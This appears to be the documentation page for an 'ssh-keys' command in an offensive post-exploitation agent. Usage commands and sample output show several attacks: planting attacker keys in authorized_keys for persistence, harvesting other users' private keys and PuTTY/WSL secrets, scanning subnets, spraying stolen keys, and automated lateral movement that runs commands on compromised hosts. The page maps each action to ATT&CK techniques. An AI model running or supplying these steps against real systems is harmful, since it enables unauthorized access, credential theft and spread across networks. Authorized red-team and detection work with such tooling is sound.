+++
title = "ssh-keys"
chapter = false
weight = 132
hidden = false
+++

## Summary

Read or manipulate SSH authorized_keys files for persistence and lateral movement. Can also extract private keys for credential harvesting, generate new key pairs, and enumerate SSH configuration for lateral movement. Supports targeting other users' `.ssh` directories. Cross-platform: Linux, macOS, and Windows (OpenSSH).

On Windows, the `enumerate` action additionally discovers:
- **PuTTY sessions** — saved connections from the registry (`HKCU\Software\SimonTatham\PuTTY\Sessions`)
- **PuTTY .ppk keys** — private key files in common locations (`%USERPROFILE%\.ssh\`, `%APPDATA%\PuTTY\`, Desktop, Documents)
- **WSL distributions** — installed Linux distributions and their SSH keys via `\\wsl$\<distro>\home\*\.ssh\`
- **OpenSSH for Windows** — system-wide host keys and sshd_config at `%ProgramData%\ssh\`
- **Git SSH config** — `core.sshCommand` and signing key references from `.gitconfig`

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| action | choose_one | Yes | list | `list`, `add`, `remove`, `read-private`, `enumerate`, `generate`, `find-reachable`, `try-keys`, or `auto-move` |
| key | string | No | - | SSH public key to add, substring to match for removal, or `noinstall` for generate without authorized_keys install |
| user | string | No | current | Target user (reads their `~/.ssh/` directory) |
| path | string | No | - | Override the default authorized_keys or private key path. For try-keys: explicit private key file or directory. |
| targets | string | No | - | Target host range for `find-reachable` / `auto-move`. Supports CIDR (`192.168.1.0/24`), comma-separated IPs, or dash ranges (`192.168.1.1-254`). |
| host | string | No | - | Single target host for `try-keys` action. |
| username | string | No | root | SSH username for `try-keys` / `auto-move`. |
| command | string | No | id | Command to run on each successfully accessed host in `auto-move`. |
| port | number | No | 22 | SSH port for `find-reachable` / `try-keys` / `auto-move`. |
| delay_ms | number | No | 500 | Milliseconds between authentication attempts. Increase to avoid lockouts. |

## Usage

### List Authorized Keys

List the current user's authorized keys:
```
ssh-keys -action list
```

List another user's keys:
```
ssh-keys -action list -user root
```

### Inject SSH Key (Persistence)

Add a public key for persistent SSH access:
```
ssh-keys -action add -key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... attacker@c2"
```

Inject into a specific user's authorized_keys (requires write access):
```
ssh-keys -action add -user www-data -key "ssh-rsa AAAA... backdoor"
```

### Remove a Key

Remove a key by matching substring (e.g., comment field):
```
ssh-keys -action remove -key "attacker@c2"
```

### Read Private Keys (Credential Harvesting)

Read all standard private key files (id_rsa, id_ecdsa, id_ed25519, id_dsa):
```
ssh-keys -action read-private
```

Read a specific private key file:
```
ssh-keys -action read-private -path /root/.ssh/id_rsa
```

Read another user's private keys:
```
ssh-keys -action read-private -user admin
```

### Example Output (list)

```
Authorized keys (/home/setup/.ssh/authorized_keys) — 2 key(s):
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... admin@server
ssh-rsa AAAAB3NzaC1yc2EAAAA... backup@vault
```

### Example Output (read-private)

```
Found 1 private key(s):

=== /home/setup/.ssh/id_ed25519 ===
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbm...
-----END OPENSSH PRIVATE KEY-----
```

### Enumerate SSH Config and Known Hosts

Enumerate SSH configuration, known hosts, and private key types for lateral movement planning:
```
ssh-keys -action enumerate
```

Enumerate another user's SSH environment:
```
ssh-keys -action enumerate -user admin
```

### Example Output (enumerate)

```
=== SSH Enumeration: /home/setup/.ssh ===

[SSH Config] 2 host(s):
  Host: prod-web
    HostName: 10.10.10.50
    User: deploy
    Port: 2222
    ProxyJump: bastion
  Host: bastion
    HostName: bastion.example.com
    User: admin
    IdentityFile: ~/.ssh/id_bastion

[Known Hosts] 3 host(s):
  bastion.example.com (ssh-ed25519)
  10.10.10.50 (ssh-rsa)
  + 1 hashed host(s) (not decodable)

[Private Keys] 2 key(s):
  id_ed25519 (411 bytes, plaintext)
  id_rsa (1766 bytes, encrypted)
```

### Example Output (enumerate on Windows)

```
=== SSH Enumeration: C:\Users\admin\.ssh ===

[SSH Config] 1 host(s):
  ...

[PuTTY Sessions] 2 session(s):
  Session: Production Server
    HostName: 10.10.10.50
    UserName: admin
    Port: 2222
    Protocol: SSH
    PrivateKey: C:\Users\admin\.ssh\prod.ppk
  Session: Dev DB
    HostName: db1.internal.corp
    Protocol: SSH

[PuTTY Keys (.ppk)] 1 file(s):
  C:\Users\admin\.ssh\prod.ppk
    Type: ssh-rsa, Encryption: aes256-cbc
    Comment: rsa-key-20240101

[WSL Distributions] 1 distro(s):
  Ubuntu
    user1/.ssh: id_ed25519, id_ed25519.pub, authorized_keys

[OpenSSH for Windows] System-wide config:
  Host keys: id_rsa, id_ed25519
  sshd_config: PubkeyAuthentication yes
  sshd_config: PasswordAuthentication no
```

### Generate Key Pair (Persistence)

Generate a new ed25519 key pair on the target, install the public key to authorized_keys, and return the private key to the operator:
```
ssh-keys -action generate
```

Generate with a custom key name:
```
ssh-keys -action generate -path /home/admin/.ssh/id_backdoor
```

Generate without installing to authorized_keys:
```
ssh-keys -action generate -key noinstall
```

Generate for a specific user:
```
ssh-keys -action generate -user www-data
```

### Example Output (generate)

```
Generated ed25519 key pair:
  Private: /home/setup/.ssh/id_ed25519
  Public:  /home/setup/.ssh/id_ed25519.pub
  Installed public key to /home/setup/.ssh/authorized_keys

=== /home/setup/.ssh/id_ed25519 ===
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbm...
-----END OPENSSH PRIVATE KEY-----

=== /home/setup/.ssh/id_ed25519.pub ===
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...
```

### Find Reachable SSH Hosts (Network Scanning)

Scan a subnet for hosts with open SSH ports:
```
ssh-keys -action find-reachable -targets 192.168.1.0/24
```

Scan specific hosts or range:
```
ssh-keys -action find-reachable -targets 10.10.10.1-50 -port 2222
```

### Try Keys Against a Target

Test all discovered private keys against a single host:
```
ssh-keys -action try-keys -host 192.168.1.10 -username ubuntu
```

Test a specific private key:
```
ssh-keys -action try-keys -host 192.168.1.10 -username admin -path /home/user/.ssh/id_rsa
```

### Auto-Move (Chained Lateral Movement)

Automatically scan for SSH hosts, authenticate with discovered keys, and execute a command:
```
ssh-keys -action auto-move -targets 192.168.1.0/24 -username ubuntu -command id
```

Auto-move with rate limiting to avoid lockouts:
```
ssh-keys -action auto-move -targets 10.10.10.1-20 -username deploy -command "cat /etc/hostname" -delay_ms 1000
```

### Example Output (find-reachable)

```
[*] Scanning 254 targets on port 22...
[+] 192.168.1.5:22 open (banner: SSH-2.0-OpenSSH_8.9p1)
[+] 192.168.1.12:22 open (banner: SSH-2.0-OpenSSH_9.3p1)
[+] 192.168.1.50:22 open (banner: SSH-2.0-OpenSSH_8.2p1)
[*] Scan complete: 3/254 hosts reachable
```

### Example Output (auto-move)

```
[*] Phase 1: Scanning 254 targets on port 22...
[+] 3 hosts reachable

[*] Phase 2: Reading local private keys...
[+] Found 2 private keys

[*] Phase 3: Testing keys against 3 hosts...
[+] 192.168.1.5 — authenticated as ubuntu with id_ed25519
    Output: uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo)
[+] 192.168.1.12 — authenticated as ubuntu with id_ed25519
    Output: uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
[-] 192.168.1.50 — no valid key found

[*] Auto-move complete: 2/3 hosts accessed
```

## MITRE ATT&CK Mapping

- T1098.004 — Account Manipulation: SSH Authorized Keys
- T1552.004 — Unsecured Credentials: Private Keys
- T1552.002 — Unsecured Credentials: Credentials in Registry (PuTTY sessions)
- T1016 — System Network Configuration Discovery (enumerate)
- T1021.004 — Remote Services: SSH (try-keys, auto-move)
- T1046 — Network Service Discovery (find-reachable)
- T1570 — Lateral Tool Transfer (auto-move)
